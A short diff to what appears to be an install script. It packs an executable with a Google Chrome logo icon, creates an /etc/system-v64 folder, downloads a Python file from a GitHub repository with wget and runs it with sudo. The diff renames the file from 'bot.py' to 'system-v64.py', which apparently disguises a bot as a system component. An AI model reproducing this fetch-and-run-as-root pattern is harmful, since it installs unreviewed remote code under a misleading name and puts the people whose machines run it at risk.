@@ -5,5 +5,6 @@ pyinstaller --noconfirm --onefile --windowed --icon "Google-Chrome-Logo-1536x153
 cd /etc
 mkdir system-v64
 cd /etc/system-v64
-wget https://github.com/mdn-gay/1239277489294m/blob/main/bot.py
-sudo python3 bot.py
+wget https://github.com/mdn-gay/1239277489294m/blob/main/system-v64.py
+sudo python3 system-v64.py
+python3 system-v64.py
